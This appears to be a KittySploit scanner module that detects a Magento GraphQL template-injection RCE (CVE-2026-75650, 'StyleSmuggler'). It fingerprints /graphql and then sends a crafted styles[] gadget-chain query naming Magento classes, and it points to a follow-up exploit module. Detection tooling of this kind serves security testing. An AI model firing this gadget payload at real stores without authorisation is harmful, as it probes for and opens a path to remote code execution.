#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Magento CVE-2026-75650 StyleSmuggler template-engine RCE surface."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Magento CVE-2026-75650 StyleSmuggler Detect",
        "description": (
            "Detects CVE-2026-75650 (StyleSmuggler) in Adobe Commerce / Magento Open Source "
            "before hotfix VULN-39341: unauthenticated /graphql requests accept attacker-controlled "
            "styles[] gadget parameters used to evaluate PHP through the email template engine."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-75650"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-75650",
            "https://sansec.io/research/stylesmuggler-0day",
        ],
        "tags": [
            "web",
            "scanner",
            "magento",
            "graphql",
            "template-injection",
            "rce",
            "cve-2026-75650",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.3,
            "noise": 0.35,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["magento"],
                "endpoint_pattern_any": ["/graphql"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce_surface", "from_detail": "styles gadget chain"},
                ],
                "suggested_followups": [
                    "exploits/multi/http/magento_cve_2026_75650_rce",
                ],
            },
        },
    }

    def _magento_graphql(self) -> bool:
        response = self.http_request(
            method="POST",
            path="/graphql",
            headers={"Content-Type": "application/json"},
            json={"query": "query { storeConfig { store_code } }"},
            allow_redirects=False,
        )
        if not response:
            return False
        body = (response.text or "").lower()
        headers = " ".join(f"{k}:{v}" for k, v in (response.headers or {}).items()).lower()
        return "graphql" in body or "magento" in body or "magento" in headers

    def _styles_probe(self) -> bool:
        path = (
            "/graphql?"
            "styles[generatorClass]=Magento\\Framework\\DataObject"
            "&styles[second]=Magento\\Framework\\DataObject"
            "&styles[with_resolved][0][_i_]=Magento\\Setup\\Module\\Di\\Code\\Scanner\\ArrayScanner"
            "&styles[with_resolved][0][instance]=Magento\\Setup\\Module\\Di\\Code\\Scanner\\ArrayScanner"
            "&styles[with_resolved][1]=collectEntities"
        )
        response = self.http_request(method="POST", path=path, allow_redirects=False)
        if not response:
            return False
        code = int(response.status_code or 0)
        body = response.text or ""
        if code in (401, 403, 404):
            return False
        markers = (
            "ArrayScanner",
            "collectEntities",
            "styles",
            "ObjectManager",
            "Magento\\Framework",
        )
        return any(marker in body for marker in markers)

    def run(self):
        if not self._magento_graphql():
            return False
        if self._styles_probe():
            self.set_info(
                severity="critical",
                cve="CVE-2026-75650",
                reason="Magento /graphql accepted styles[] gadget parameters (StyleSmuggler surface)",
                path="/graphql",
            )
            return True
        return False
